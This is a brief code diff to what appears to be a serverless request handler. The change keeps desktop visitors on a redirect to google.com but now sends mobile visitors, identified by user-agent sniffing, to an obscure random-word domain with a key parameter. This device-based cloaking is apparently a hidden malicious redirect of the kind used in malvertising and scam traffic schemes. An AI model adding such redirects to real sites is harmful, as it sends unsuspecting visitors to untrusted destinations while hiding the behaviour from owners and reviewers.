@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://www.google.com/share.google?q=BSN8Os0U4KWtt5cdN", 302);
+    return Response.redirect("https://stickingtortoiseapology.com/xdmz8up55?key=a020f416f71ece8e252f939903b79a97", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
